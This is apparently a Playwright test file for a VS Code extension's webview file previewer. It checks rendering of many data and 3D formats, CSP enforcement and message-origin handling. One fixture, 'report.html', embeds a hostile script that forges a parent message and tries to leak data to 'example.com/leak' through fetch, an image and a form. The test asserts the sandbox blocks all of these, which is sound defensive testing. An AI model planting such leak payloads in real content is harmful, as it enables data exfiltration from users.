// Real Chromium renderers and CSP with VS Code's parent-to-content transport.
import assert from 'node:assert/strict';
import http from 'node:http';
import { readFile } from 'node:fs/promises';
import { createRequire } from 'node:module';
import { extname, join, resolve, sep } from 'node:path';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright';

const require = createRequire(import.meta.url);
const { getWebviewHtml } = require('../vscode/extension.js');
const root = fileURLToPath(new URL('..', import.meta.url));
const media = join(root, 'build', 'vscode', 'media');
let payload;
let useNullSource = false;
let base;
const blocked = [];
const server = http.createServer(async (request, response) => {
  const path = new URL(request.url, 'http://localhost').pathname;
  const send = (type, body) => {
    response.writeHead(200, { 'content-type': type });
    response.end(body);
  };
  try {
    if (path === '/host') {
      send(
        'text/html',
        '<iframe id="preview" src="/webview" style="width:100%;height:95vh"></iframe><script src="/parent.js"></script>'
      );
    } else if (path === '/parent.js') {
      send(
        'text/javascript',
        `addEventListener('message', async event => {
        const frame = document.getElementById('preview');
        if (event.source !== frame.contentWindow || event.origin !== location.origin) return;
        if (event.data.type === 'bridge' && ['ready', 'refresh'].includes(event.data.message.type)) {
          const payload = await (await fetch('/payload')).json();
          if (${useNullSource}) {
            const target = frame.contentWindow;
            target.dispatchEvent(new target.MessageEvent('message', { data: payload, origin: location.origin }));
          } else {
            frame.contentWindow.postMessage(payload, location.origin);
          }
        }
      });`
      );
    } else if (path === '/payload') {
      send('application/json', JSON.stringify(payload));
    } else if (path === '/webview') {
      const html = getWebviewHtml(
        {
          cspSource: base + '/assets/',
          asWebviewUri: (asset) => asset,
        },
        base + '/assets/',
        {
          Uri: { joinPath: (asset, name) => new URL(name, asset) },
        }
      );
      send(
        'text/html',
        html.replace(
          '<script type="module"',
          `<script src="${base}/assets/bridge.js"></script><script type="module"`
        )
      );
    } else if (path === '/assets/bridge.js') {
      send(
        'text/javascript',
        `window.acquireVsCodeApi = () => ({ postMessage: message => parent.postMessage({type: 'bridge', message}, location.origin) });`
      );
    } else if (path.startsWith('/assets/')) {
      const file = resolve(media, decodeURIComponent(path.slice('/assets/'.length)));
      if (!file.startsWith(media + sep)) throw new Error('Invalid asset path');
      send(extname(file) === '.css' ? 'text/css' : 'text/javascript', await readFile(file));
    } else {
      blocked.push(path);
      response.writeHead(404).end();
    }
  } catch (error) {
    response.writeHead(500).end(error.message);
  }
});
await new Promise((done) => server.listen(0, '127.0.0.1', done));
base = `http://127.0.0.1:${server.address().port}`;
const browser = await chromium.launch({
  headless: true,
  args: ['--use-gl=angle', '--use-angle=swiftshader', '--enable-unsafe-swiftshader'],
});
const failures = [];

async function run(
  name,
  bytes,
  check,
  { companions = {}, rendererError = false, cspViolations = false, nullSource = false } = {}
) {
  if (process.argv.length > 2 && !process.argv.slice(2).includes(name)) return;
  useNullSource = nullSource;
  payload = {
    type: 'preview',
    name,
    ext: extname(name).toLowerCase(),
    bytes: Buffer.from(bytes).toString('base64'),
    companions,
  };
  const page = await browser.newPage({ viewport: { width: 800, height: 600 } });
  page.setDefaultTimeout(10000);
  const errors = [];
  await page.addInitScript(() => {
    window.__cspViolations = [];
    addEventListener('securitypolicyviolation', (event) => {
      window.__cspViolations.push(event.violatedDirective + ': ' + event.blockedURI);
    });
  });
  page.on('pageerror', (error) => errors.push(error.stack));
  page.on('console', (message) => {
    if (message.type() === 'error' && !cspViolations) errors.push(message.text());
  });
  await page.route('**/*', (route) => {
    if (
      route
        .request()
        .url()
        .startsWith(base + '/')
    )
      return route.continue();
    blocked.push(route.request().url());
    return route.abort();
  });
  try {
    await page.goto(base + '/host');
    const frame = page.frames().find((candidate) => candidate.url() === base + '/webview');
    assert.ok(frame, 'VS Code content iframe exists');
    await frame.waitForFunction(
      () =>
        document.getElementById('status').hidden ||
        document.getElementById('status').textContent.startsWith('Could not preview:')
    );
    const rendererErrors = await frame.locator('#mount .ov-msg').allTextContents();
    if (!rendererError)
      assert.deepEqual(rendererErrors, [], 'Renderer errors: ' + rendererErrors.join('\n'));
    await check(frame, page);
    if (!cspViolations) {
      assert.deepEqual(
        await frame.evaluate(() => window.__cspViolations),
        [],
        'No resources blocked by CSP'
      );
    }
    assert.deepEqual(errors, [], 'No renderer exceptions');
    console.log('PASS VS Code: ' + name);
  } catch (error) {
    failures.push(name);
    console.error('FAIL VS Code: ' + name + '\n' + error.stack + '\n' + errors.join('\n'));
  } finally {
    await page.close();
  }
}

try {
  for (const [name, selector, text] of [
    ['array.npy', '#mount canvas', ''],
    ['array.npz', '#mount canvas', 'field'],
    ['metrics.parquet', '#mount table', 'accuracy'],
    ['metrics.arrow', '#mount table', 'accuracy'],
    ['model.safetensors', '#mount table', 'embed_tokens'],
    ['model.gguf', '#mount table', 'llama'],
    ['model.onnx', '#mount svg', 'Softmax'],
    ['depth.tiff', '#mount canvas', 'TIFF'],
    ['render.hdr', '#mount canvas', 'Radiance HDR'],
    ['render.exr', '#mount canvas', 'EXR'],
    ['cube.obj', '#mount canvas', ''],
    ['points.ply', '#mount canvas', ''],
    ['capybara.splat', '#mount canvas', 'splats'],
    ['capybara.ply', '#mount canvas', 'splats'],
    ['capybara.spz', '#mount canvas', 'splats'],
    ['capybara-v4.spz', '#mount canvas', 'splats'],
    ['capybara.ksplat', '#mount canvas', 'splats'],
    ['capybara.sog', '#mount canvas', 'splats'],
    ['notebook.ipynb', '.ov-nb-plotly .main-svg', 'Notebook sample'],
  ]) {
    await run(name, await readFile(join(root, 'samples', name)), async (frame) => {
      assert.equal(
        await frame.locator('#status').isHidden(),
        true,
        await frame.locator('#status').innerText()
      );
      await frame.locator(selector).first().waitFor({ state: 'attached' });
      if (text) assert.ok((await frame.locator('#mount').innerText()).includes(text));
      if (selector.includes('canvas')) {
        assert.ok(
          await frame
            .locator('#mount canvas')
            .first()
            .evaluate((canvas) => canvas.width > 0 && canvas.height > 0)
        );
      }
    });
  }
  const companions = {};
  await run(
    'native.npy',
    await readFile(join(root, 'samples', 'array.npy')),
    async (frame) => {
      assert.equal(await frame.locator('#status').isHidden(), true);
      await frame.locator('#mount canvas').waitFor({ state: 'attached' });
    },
    { nullSource: true }
  );
  const positions = Buffer.from(new Float32Array([0, 0, 0, 1, 0, 0, 0, 1, 0]).buffer);
  await run(
    'triangle.gltf',
    JSON.stringify({
      asset: { version: '2.0' },
      scene: 0,
      scenes: [{ nodes: [0] }],
      nodes: [{ mesh: 0 }],
      meshes: [{ primitives: [{ attributes: { POSITION: 0 } }] }],
      buffers: [
        {
          byteLength: positions.byteLength,
          uri: 'data:application/octet-stream;base64,' + positions.toString('base64'),
        },
      ],
      bufferViews: [{ buffer: 0, byteOffset: 0, byteLength: positions.byteLength }],
      accessors: [
        {
          bufferView: 0,
          componentType: 5126,
          count: 3,
          type: 'VEC3',
          min: [0, 0, 0],
          max: [1, 1, 0],
        },
      ],
    }),
    async (frame) => {
      await frame.locator('#mount canvas').waitFor({ state: 'attached' });
      await frame.locator('.ov3d-panel').waitFor({ state: 'attached' });
      assert.deepEqual(await frame.locator('.ov-msg').allTextContents(), []);
    }
  );
  // A GLB image buffer becomes a blob URL, fetched by Three's ImageBitmapLoader.
  const texture = await readFile(join(root, 'extension', 'icons', 'icon128.png'));
  const uv = Buffer.from(new Float32Array([0, 0, 1, 0, 0, 1]).buffer);
  const imageOffset = positions.byteLength + uv.byteLength;
  const binary = Buffer.concat([
    positions,
    uv,
    texture,
    Buffer.alloc((4 - (texture.byteLength % 4)) % 4),
  ]);
  const glbJson = Buffer.from(
    JSON.stringify({
      asset: { version: '2.0' },
      scene: 0,
      scenes: [{ nodes: [0] }],
      nodes: [{ mesh: 0 }],
      meshes: [{ primitives: [{ attributes: { POSITION: 0, TEXCOORD_0: 1 }, material: 0 }] }],
      materials: [{ pbrMetallicRoughness: { baseColorTexture: { index: 0 }, metallicFactor: 0 } }],
      textures: [{ source: 0 }],
      images: [{ bufferView: 2, mimeType: 'image/png' }],
      buffers: [{ byteLength: binary.byteLength }],
      bufferViews: [
        { buffer: 0, byteOffset: 0, byteLength: positions.byteLength },
        { buffer: 0, byteOffset: positions.byteLength, byteLength: uv.byteLength },
        { buffer: 0, byteOffset: imageOffset, byteLength: texture.byteLength },
      ],
      accessors: [
        {
          bufferView: 0,
          componentType: 5126,
          count: 3,
          type: 'VEC3',
          min: [0, 0, 0],
          max: [1, 1, 0],
        },
        { bufferView: 1, componentType: 5126, count: 3, type: 'VEC2' },
      ],
    })
  );
  const jsonChunk = Buffer.concat([
    glbJson,
    Buffer.alloc((4 - (glbJson.byteLength % 4)) % 4, 0x20),
  ]);
  const header = Buffer.alloc(20);
  header.writeUInt32LE(0x46546c67, 0);
  header.writeUInt32LE(2, 4);
  header.writeUInt32LE(28 + jsonChunk.byteLength + binary.byteLength, 8);
  header.writeUInt32LE(jsonChunk.byteLength, 12);
  header.writeUInt32LE(0x4e4f534a, 16);
  const binaryHeader = Buffer.alloc(8);
  binaryHeader.writeUInt32LE(binary.byteLength, 0);
  binaryHeader.writeUInt32LE(0x004e4942, 4);
  await run(
    'textured.glb',
    Buffer.concat([header, jsonChunk, binaryHeader, binary]),
    async (frame) => {
      await frame.locator('.ov3d-panel').waitFor({ state: 'attached' });
      assert.deepEqual(await frame.locator('.ov-msg').allTextContents(), []);
    }
  );
  for (const name of ['index.bin', 'data.bin'])
    companions[name] = (await readFile(join(root, 'samples', 'lcc', name))).toString('base64');
  await run(
    'meta.lcc',
    await readFile(join(root, 'samples', 'lcc', 'meta.lcc')),
    async (frame) => {
      await frame.locator('#mount canvas').waitFor();
      assert.match(await frame.locator('#mount').innerText(), /splats/);
    },
    { companions }
  );

  await run(
    'report.html',
    '<h1>Safe report</h1><script>parent.postMessage({type:"preview",name:"forged"},"*"); fetch("https://example.com/leak")</script><img src="https://example.com/leak"><form action="https://example.com/leak"></form>',
    async (frame) => {
      const report = frame.childFrames()[0];
      await report.locator('h1').waitFor();
      assert.equal(await report.locator('h1').innerText(), 'Safe report');
      assert.equal(await report.evaluate(() => typeof acquireVsCodeApi), 'undefined');
      assert.equal(
        await report.evaluate(() => {
          try {
            return parent.document.body.innerText;
          } catch {
            return 'blocked';
          }
        }),
        'blocked'
      );
      assert.equal(await frame.locator('#filename').innerText(), 'report.html');
      assert.equal(await frame.locator('iframe').getAttribute('sandbox'), 'allow-scripts');
      // A forged child message must not overwrite the selected preview.
      await report.evaluate(() => parent.postMessage({ type: 'error', message: 'forged' }, '*'));
      await frame.waitForTimeout(50);
      assert.equal(await frame.locator('#status').isHidden(), true);
      payload = { ...payload, bytes: Buffer.from('<h1>Updated report</h1>').toString('base64') };
      await frame.locator('#refresh').click();
      await frame
        .locator('iframe')
        .contentFrame()
        .locator('h1')
        .filter({ hasText: 'Updated report' })
        .waitFor();
    },
    { cspViolations: true }
  );
  await run(
    'broken.npy',
    'not an array',
    async (frame) => {
      assert.match(await frame.locator('#mount .ov-msg').innerText(), /not a .npy file/);
      assert.equal(await frame.locator('#refresh').isEnabled(), true);
    },
    { rendererError: true }
  );
  await run(
    'pointer.npy',
    'version https://git-lfs.github.com/spec/v1\noid sha256:' + 'a'.repeat(64) + '\nsize 123\n',
    async (frame) => {
      assert.match(await frame.locator('#status').innerText(), /git lfs pull/);
    }
  );
  assert.deepEqual(blocked, [], 'No untrusted network requests or workspace resource reads');
} finally {
  await browser.close();
  await new Promise((done) => server.close(done));
}
if (failures.length) throw new Error('VS Code webview failures: ' + failures.join(', '));
